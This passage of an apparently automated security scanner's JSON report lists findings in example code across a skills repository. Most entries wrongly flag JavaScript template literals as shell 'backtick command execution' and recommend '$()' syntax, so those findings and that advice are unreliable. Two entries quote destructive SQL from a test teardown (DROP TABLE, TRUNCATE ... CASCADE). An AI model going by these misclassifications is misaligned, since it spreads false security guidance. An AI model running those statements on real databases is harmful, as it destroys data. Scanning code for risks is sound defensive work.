      "issue": "Backtick command execution",
      "evidence": "console.log(`  [Cache] Size after invalidation: ${cache.size}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 18,
      "issue": "Backtick command execution",
      "evidence": "this.key = `leaderboard:${name}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 29,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Leaderboard] Added ${playerId} with score ${score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 41,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Leaderboard] Incremented ${playerId} by ${increment} (new: ${newScore})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 140,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Leaderboard] Removed ${playerId}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 157,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Leaderboard] Cleared`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 171,
      "issue": "Backtick command execution",
      "evidence": "super(redisClient, `${name}:${period}:${timestamp}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 190,
      "issue": "Backtick command execution",
      "evidence": "return `${now.getFullYear()}-W${week}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 193,
      "issue": "Backtick command execution",
      "evidence": "return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 220,
      "issue": "Backtick command execution",
      "evidence": "console.log(`[Leaderboard] Set expiration: ${days} days`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 248,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 256,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${player}: Rank ${rank + 1}, Score ${score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 264,
      "issue": "Backtick command execution",
      "evidence": "console.log(`player3: New Rank ${newRank + 1}, New Score ${newScore}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 271,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}${marker}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 277,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Total players: ${count}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 295,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Key: ${daily.key}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 304,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 313,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Key: ${weekly.key}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 322,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 344,
      "issue": "Backtick command execution",
      "evidence": "await leaderboard.addScore(`player${i}`, i * 100);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 351,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 357,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${highScorers.length} high scorers`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 359,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 401,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 407,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 413,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 418,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Casual: ${await casual.getScore('player1')} (Rank ${await casual.getRank('player1') + 1})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 419,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Ranked: ${await ranked.getScore('player1')} (Rank ${await ranked.getRank('player1') + 1})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
      "line_number": 420,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Tournament: ${await tournament.getScore('player1')} (Rank ${await tournament.getRank('player1') + 1})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 321,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${results1.length} results`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 323,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name} - $${r.price}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 329,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${suggestions.length} suggestions`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 331,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${s.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 337,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${faceted.results.length} results`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 347,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${boosted.length} results`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 349,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 355,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Page 1: ${page1.results.length} results, hasMore: ${page1.hasMore}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
      "line_number": 359,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Page 2: ${page2.results.length} results`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 246,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Change ${i + 1}:`, change.change.message || '(no message)');",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 249,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nTotal changes: ${history.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 250,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Current counter: ${doc.counter}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 310,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 329,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 334,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 344,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 349,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
      "line_number": 379,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nSaved to ${bytes.length} bytes`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
      "line_number": 58,
      "issue": "Backtick command execution",
      "evidence": "config.headers.Authorization = `Bearer ${token}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
      "line_number": 83,
      "issue": "Backtick command execution",
      "evidence": "originalRequest.headers.Authorization = `Bearer ${token}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
      "line_number": 154,
      "issue": "Backtick command execution",
      "evidence": "`${this.api.defaults.baseURL}/refresh`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 131,
      "issue": "Backtick command execution",
      "evidence": "const cacheKey = `${options.method}:${url}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 149,
      "issue": "Backtick command execution",
      "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 287,
      "issue": "Backtick command execution",
      "evidence": "return this.request<User>(`/api/users/${userId}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 306,
      "issue": "Backtick command execution",
      "evidence": "return this.request<User>(`/api/users/${userId}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 316,
      "issue": "Backtick command execution",
      "evidence": "return this.request<User>(`/api/users/${userId}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
      "line_number": 326,
      "issue": "Backtick command execution",
      "evidence": "return this.request<void>(`/api/users/${userId}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
      "line_number": 391,
      "issue": "Backtick command execution",
      "evidence": "message: `Post not found: ${id}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
      "line_number": 466,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\ud83d\ude80 GraphQL server ready at ${url}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
      "line_number": 270,
      "issue": "Backtick command execution",
      "evidence": "id: `temp-${Date.now()}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
      "line_number": 291,
      "issue": "Backtick command execution",
      "evidence": "cursor: `temp-${Date.now()}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
      "line_number": 388,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Found ${postsPage1.totalCount} total posts`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
      "line_number": 395,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Retrieved ${allPosts.length} posts`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
      "line_number": 432,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Update: ${posts.edges.length} posts in cache`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 189,
      "issue": "Destructive database operation",
      "evidence": "await pool.query('DROP TABLE IF EXISTS users');",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 195,
      "issue": "Destructive database operation",
      "evidence": "await pool.query('TRUNCATE TABLE users RESTART IDENTITY CASCADE');",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 273,
      "issue": "Backtick command execution",
      "evidence": ".get(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 313,
      "issue": "Backtick command execution",
      "evidence": "name: `User ${i}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 314,
      "issue": "Backtick command execution",
      "evidence": "email: `user${i}@example.com`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 359,
      "issue": "Backtick command execution",
      "evidence": ".patch(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 373,
      "issue": "Backtick command execution",
      "evidence": "const getResponse = await request(app).get(`/users/${userId}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 404,
      "issue": "Backtick command execution",
      "evidence": ".delete(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 409,
      "issue": "Backtick command execution",
      "evidence": ".get(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 435,
      "issue": "Backtick command execution",
      "evidence": ".get(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 442,
      "issue": "Backtick command execution",
      "evidence": ".patch(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 453,
      "issue": "Backtick command execution",
      "evidence": ".delete(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 458,
      "issue": "Backtick command execution",
      "evidence": ".get(`/users/${userId}`)",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 485,
      "issue": "Backtick command execution",
      "evidence": "name: `User ${i}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
      "line_number": 486,
      "issue": "Backtick command execution",
      "evidence": "email: `user${i}@perf.com`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 49,
      "issue": "Backtick command execution",
      "evidence": "let hstsValue = `max-age=${hstsMaxAge}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 194,
      "issue": "Backtick command execution",
      "evidence": "`script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 195,
      "issue": "Backtick command execution",
      "evidence": "`style-src 'self' 'nonce-${nonce}'`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 253,
      "issue": "Backtick command execution",
      "evidence": "*       <style nonce={nonce}>{`body { margin: 0; }`}</style>",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 418,
      "issue": "Backtick command execution",
      "evidence": "\\`script-src 'self' 'nonce-\\${nonce}' 'strict-dynamic'\\`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
      "line_number": 419,
      "issue": "Backtick command execution",
      "evidence": "\\`style-src 'self' 'nonce-\\${nonce}'\\`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
      "line_number": 220,
      "issue": "Backtick command execution",
      "evidence": "const orderId = `order-${Date.now()}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
      "line_number": 368,
      "issue": "Backtick command execution",
      "evidence": "throw new Error(`Cannot fulfill order in status: ${order.status}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
      "line_number": 454,
      "issue": "Backtick command execution",
      "evidence": "console.log(`${SERVICE_NAME} listening on port ${PORT}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
      "line_number": 455,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Traces will be sent to: ${OTLP_ENDPOINT}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/observability/metrics-instrumentation/resources/examples/typescript/express_metrics.ts",
      "line_number": 348,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Metrics endpoint: http://localhost:${PORT}/metrics`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
      "line_number": 146,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/users/${id}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
      "line_number": 157,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/users/${id}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
      "line_number": 177,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/users/${id}`, { method: 'DELETE' });",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 91,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/users/${id}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 97,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/posts?page=${page}&pageSize=${pageSize}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 103,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/posts/${id}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 109,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/posts/${postId}/comments`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 125,
      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/posts/${id}`, {",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
      "line_number": 135,
